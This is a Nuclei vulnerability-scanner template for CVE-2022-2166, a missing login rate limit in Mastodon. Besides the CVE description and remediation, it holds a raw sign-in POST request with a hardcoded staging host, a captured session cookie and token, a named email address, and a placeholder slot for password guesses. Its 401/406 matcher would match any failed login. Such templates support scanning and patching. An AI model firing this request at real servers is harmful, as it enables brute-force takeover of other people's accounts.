id: CVE-2022-2166

info:
  name: Improper Restriction of Excessive Authentication Attempts in Mastodon
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Vulnerability due to misconfigured Rack_Attack.rb in Mastodon allows bypassing of sign-in restrictions and brute force attacks without proper throttling or IP blocking.
  impact: |
    An attacker can perform brute force attacks to gain unauthorized access to user accounts.
  remediation: |
    Implement account lockout mechanisms after a certain number of failed authentication attempts to prevent brute force attacks.
  reference:
    - https://huntr.dev/bounties/2f96f990-01c2-44ea-ae47-58bdb3aa455b
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-2166
    cwe-id: CWE-307
    epss-score: 0.00213
    epss-percentile: 0.60105
    cpe: cpe:2.3:a:joinmastodon:mastodon:*:*:*:*:*:*:*:*
  metadata:
    vendor: joinmastodon
    product: mastodon
  tags: huntr

http:
  - method: POST
    path:
      - "/auth/sign_in.json"

    headers:
      Host: "staging.mastodon.social"
      Cookie: "_mastodon_session=wM5JZ5uFbag8V81Jk2jWsVES1Gl8dkukxjZdaN%2FnNNHh9UFamiUn62zY8Mh9nR8zu82pD%2FddQndPV8rJTgIiMPppVybkaJ3ULzMmawkADNUvx7q9Lz8vmT0svrnKDfL9MqnQ5YhKEvIq6c3LPBM8O1U%2FT4qQk2FZIoyjc1S1O8kbBBj6eYztCHLDdC25PnZ9%2Fd0IOB2fEW9qDnvNrNzxw77UcgRHjt9GWCw%2BPTh1aBS6J8a9f94ZXf%2BlgE2dCubsH7V5PL8Ijuq1bsePt27q1Pb8TbXzCBaO%2FA%3D%3D--JIrYMu6fwlXhF3%2FU--cSi5lAMp4z2IyeM1WfCzdQ%3D%3D"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0"
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
      Accept-Language: "en-US,en;q=0.5"
      Accept-Encoding: "gzip, deflate"
      Content-Type: "application/x-www-form-urlencoded"
      Origin: "https://staging.mastodon.social"
      Dnt: "1"
      Referer: "https://staging.mastodon.social/auth/sign_in"
      Upgrade-Insecure-Requests: "1"
      Sec-Fetch-Dest: "document"
      Sec-Fetch-Mode: "navigate"
      Sec-Fetch-Site: "same-origin"
      Sec-Fetch-User: "?1"
      Te: "trailers"
      Connection: "close"

    body: |
      authenticity_token=1ItjuEy9z3KwYRBwjKswfJWvwnGXIrnLvn7AT2czIG1jYpaN193lao-RldsgPydOi06hRmp12FXs6zK0jd6sZA&user[email]=themayor@intigriti.me&user[password]=§testpasswordhere§&button=
    matchers:
      - type: status
        status:
          - 401
          - 406
